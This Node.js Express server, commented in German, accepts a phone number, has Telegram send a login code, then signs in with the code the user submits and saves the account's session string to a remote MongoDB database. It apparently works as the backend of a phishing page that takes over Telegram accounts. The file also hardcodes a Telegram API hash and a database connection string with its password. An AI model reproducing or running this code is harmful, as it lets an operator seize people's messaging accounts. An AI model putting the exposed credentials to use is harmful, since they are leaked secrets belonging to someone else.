const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0';

mongoose.connect(MONGO_URI).catch(console.error);

const SessionSchema = new mongoose.Schema({ phone: String, session: String });
const SessionModel = mongoose.model('Session', SessionSchema);

// Memory Storage mit Cleanup
const activeClients = new Map();

app.post('/send-code', async (req, res) => {
    try {
        const { phone } = req.body;
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        
        const result = await client.sendCode({ apiId, apiHash }, phone);
        
        // Speichere Client und Hash. Lösche nach 5 Min bei Inaktivität
        activeClients.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        setTimeout(() => activeClients.delete(phone), 300000);
        
        res.json({ success: true });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
});

app.post('/verify-code', async (req, res) => {
    try {
        const { phone, code } = req.body;
        const sessionData = activeClients.get(phone);

        if (!sessionData) return res.status(400).json({ error: "Session abgelaufen." });

        const { client, phoneCodeHash } = sessionData;

        await client.signIn({
            apiId,
            apiHash,
            phoneNumber: phone,
            phoneCode: code,
            phoneCodeHash: phoneCodeHash
        });

        const stringSession = client.session.save();
        await SessionModel.create({ phone, session: stringSession });
        
        activeClients.delete(phone);
        res.json({ success: true });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
});

app.listen(process.env.PORT || 3000);
